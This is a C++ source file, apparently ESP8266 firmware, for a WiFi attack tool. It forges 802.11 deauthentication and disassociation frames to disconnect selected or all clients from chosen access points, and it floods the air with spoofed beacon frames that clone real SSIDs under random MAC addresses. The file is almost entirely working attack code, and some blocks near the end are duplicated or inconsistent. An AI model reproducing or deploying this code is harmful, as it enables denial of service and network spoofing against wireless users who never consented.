#include "Attack.h"

Attack::Attack(){
  randomSeed(os_random());
}

void Attack::generate(){
  if(debug) Serial.print("generating Macs");
  
  Mac _randomBeaconMac;
  uint8_t _randomMacBuffer[6];
  beaconAdrs._clear();
  
  do{
    getRandomVendorMac(_randomMacBuffer);
    for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
    if(debug) Serial.print(".");
  }while(beaconAdrs.add(_randomBeaconMac) >= 0);
  if(debug) Serial.println("done ");
}

void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason){
  packetSize = 0;
  for(int i=0;i<sizeof(deauthPacket);i++){
    packet[i] = deauthPacket[i];
    packetSize++;
  }

  for(int i=0;i<6;i++){
    //set target (client)
    packet[4+i] = _client._get(i);
    //set source (AP)
    packet[10+i] = packet[16+i] = _ap._get(i);
  }

  //set type
  packet[0] = type;
  packet[24] = reason;
}

void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encrypt){
  packetSize = 0;
  int ssidLen = _ssid.length();
  if(ssidLen>32) ssidLen = 32;

  for(int i=0;i<sizeof(beaconPacket_header);i++){
    packet[i] = beaconPacket_header[i];
    packetSize++;
  }

  for(int i=0;i<6;i++){
    //set target (client)
    //packet[4+i] = _client._get(i);
    packet[4+i] = _client._get(i);
    //set source (AP)
    packet[10+i] = packet[16+i] = _ap._get(i);
  }
  
  packet[packetSize] = 0x00;
  packetSize++;
  packet[packetSize] = ssidLen;
  packetSize++;
  
  for(int i=0;i<ssidLen;i++){
    packet[packetSize] = _ssid[i];
    packetSize++;
  }

  for(int i=0;i<sizeof(beaconPacket_end);i++){
    packet[packetSize] = beaconPacket_end[i];
    packetSize++;
  }
  
  packet[packetSize] = _ch;
  packetSize++;

  if(encrypt){
    for(int i=0;i<sizeof(beaconWPA2tag);i++){
      packet[packetSize] = beaconWPA2tag[i];
      packetSize++;  
    }
  }
  
}

bool Attack::send(){
  if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
    /*if(debug){
  delay(1); //less packets will be dropped
  if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
    if(debug){
      Serial.print(packetSize);
      Serial.print(" : ");
      PrintHex8(packet, packetSize);
      Serial.println("");
    }*/
    return false;
  }
  delay(1); //less packets are beeing dropped
  return true;
}

void Attack::run(){
  unsigned long currentMillis = millis();

  /* =============== Deauth Attack =============== */
  if(isRunning[0] && currentMillis-prevTime[0] >= 1000){
    if(debug) Serial.print("running "+(String)attackNames[0]+" attack");

    for(int a=0;a<apScan.results;a++){
      if(apScan.isSelected(a)){
        Mac _ap;
        int _ch = apScan.getAPChannel(a);
        _ap.setMac(apScan.aps._get(a));

        wifi_set_channel(_ch);

        int _selectedClients = 0;
        for(int i=0;i<clientScan.results;i++){
          if(clientScan.getClientSelected(i)){
            _selectedClients++;

            buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, 0x01 );
            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
            
            buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, 0x01 );
            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
            
          }
        }
        
        if(_selectedClients == 0){
          Mac _client;
          _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
          buildDeauth(_ap, _client, 0xc0, 0x01 );
          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
            
          buildDeauth(_ap, _client, 0xa0, 0x01 );
          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[0]++;
        }
        
      } 
    }

    prevTime[0] = millis();
    stati[0] = (String)packetsCounter[0]+"pkts/s";
    packetsCounter[0] = 0;
    if(debug) Serial.println(" done ");
  }

  /* =============== Beacon Attack =============== */
  if(isRunning[1] && currentMillis-prevTime[1] >= 100){
    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");

    //int a = apScan.getFirstTarget();
    
    for(int a=0;a<apScan.results;a++){
      if(apScan.isSelected(a)){
        String _ssid = apScan.getAPName(a);
        int _ssidLen = _ssid.length();
        int _restSSIDLen = 32 - _ssidLen;
        int _ch = apScan.getAPChannel(a);

        Mac _broadcast;
        _broadcast.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);

        wifi_set_channel(_ch);

        //int _selectedClients = 0;

        for(int c=0;c<macListLen/apScan.selectedSum;c++){
          String _apName = _ssid;
              
          if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP           "
          else if(c < _restSSIDLen*2){
            _apName = " "+_apName;
            for(int d=0;d<(_restSSIDLen-1)-c/2;d++) _apName += " ";//e.g. " SAMPLEAP   "
          }else if(c < _restSSIDLen*3){
            _apName += ".";
            for(int d=0;d<(_restSSIDLen-1)-c/3;d++) _apName += " ";//e.g. ".SAMPLEAP   "
          } else{
            for(int d=0; d < _restSSIDLen-1; d++) _apName += " ";
            _apName += (String)c;//e.g. "SAMPLEAP        78"
          }

          //build a broadcast packet for this AP & SSID
          buildBeacon(beaconAdrs._get(c),_broadcast,_apName,_ch,apScan.getAPEncryption(a) != "none");

          /*
          for(int b=0;b<clientScan.results;b++){
            if(clientScan.getClientSelected(b)){
              _selectedClients++;

              //change packet to adress only the selected client
              for(int i=0;i<6;i++) packet[4+i] = clientScan.getClientMac(b)._get(i);
              
              if(send()) packetsCounter[1]++;
            }
          }*/

          //if no clients are selected send the broadcast packet
          /*if(_selectedClients == 0)*/ if(send()) packetsCounter[1]++;
        }
        
      }
    }
    
    stati[1] = (String)(packetsCounter[1]*10)+"pkts/s";
    packetsCounter[1] = 0;
    macListChangeCounter++;
    if(macListChangeCounter*10 >= macListInterval){
      generate();
      macListChangeCounter = 0;
    }
    if(debug) Serial.println(" done ");
    prevTime[1] = millis();
  }

  if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");

    prevTime[0] = millis();
    stati[0] = (String)packetsCounter[0]+"pkts/s";
    packetsCounter[0] = 0;
    if(debug) Serial.println(" done ");
  }

  if(isRunning[1] && currentMillis-prevTime[1] >= 1000){
    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");

    for(int a=0;a<apScan.results;a++){
      if(apScan.isSelected(a)){
        String _ssid = apScan.getAPName(a);
        int _ch = apScan.getAPChannel(a);

        wifi_set_channel(_ch);

        int _selectedClients = 0;
        for(int i=0;i<clientScan.results;i++){
          if(clientScan.getClientSelected(i)){
            _selectedClients++;

            buildBeacon(beaconAdrs._get(0),clientScan.getClientMac(i),_ssid+" 2",_ch,false);
            for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;
            
          }
        }
        
        if(_selectedClients == 0){
          Mac _client;
          _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);

          buildBeacon(beaconAdrs._get(0),_client,_ssid+" 2",_ch,false);
          for(int h=0;h<packetRate;h++) if(send()) packetsCounter[1]++;

        }
        
      } 
    }
    
    prevTime[1] = millis();
    stati[1] = (String)packetsCounter[1]+"pkts/s";
    packetsCounter[1] = 0;
    if(debug) Serial.println(" done ");
  }

  if(isRunning[2] && currentMillis-prevTime[2] >= 1000){
    if(debug) Serial.print("running "+(String)attackNames[1]+" attack");

    prevTime[1] = millis();
    stati[1] = (String)packetsCounter[1]+"pkts/s";
    packetsCounter[1] = 0;
    if(debug) Serial.println(" done ");
  }
}

void Attack::start(int num){
  if(!isRunning[num]){
    isRunning[num] = true;
    stati[num] = "starting";
    prevTime[num] = millis();
    if(debug) Serial.println("starting "+(String)attackNames[num]+" attack");
  }else stop(num);
  
}

void Attack::stop(int num){
  if(isRunning[num] && debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
  isRunning[num] = false;
  stati[num] = "ready";
  prevTime[num] = millis();
  if(isRunning[num]){
    isRunning[num] = false;
    stati[num] = "ready";
    prevTime[num] = millis();
    if(debug) Serial.println("stopping "+(String)attackNames[num]+" attack");
  }
}

void Attack::stopAll(){
  for(int i=0;i<attacksNum;i++) stop(i);
}

String Attack::getResults(){
  if(debug) Serial.print("getting attacks JSON...");
  
  if(apScan.getFirstTarget() < 0) stati[0] = stati[1] = "no AP";

  int _selected;
  String json = "{ \"aps\": [";

  _selected = 0;
  for(int i=0;i<apScan.results;i++){
    if(apScan.isSelected(i)){
      json += "\""+apScan.getAPName(i)+"\",";
      _selected++;
    }
  }
  if(_selected > 0) json.remove(json.length()-1);

  json += "], \"clients\": [";
  
  _selected = 0;
  for(int i=0;i<clientScan.results;i++){
    if(clientScan.getClientSelected(i)){
      json += "\""+clientScan.getClientMac(i).toString()+" "+clientScan.getClientVendor(i)+" - "+clientScan.getClientName(i)+"\",";
      _selected++;
    }
  }
  if(_selected == 0) json += "\"FF:FF:FF:FF:FF:FF - BROADCAST\"";
  else json.remove(json.length()-1);
  
  json += "], \"attacks\": [";
  for(int i=0;i<attacksNum;i++){
    json += "{";
    json += "\"name\": \""+attackNames[i]+"\",";
    json += "\"status\": \""+stati[i]+"\",";
    json += "\"running\": "+(String)isRunning[i];
    json += "}";
    if(i != attacksNum-1) json += ",";
  }
  json += "] }";
  if(debug) Serial.println("done ");
  return json;
}
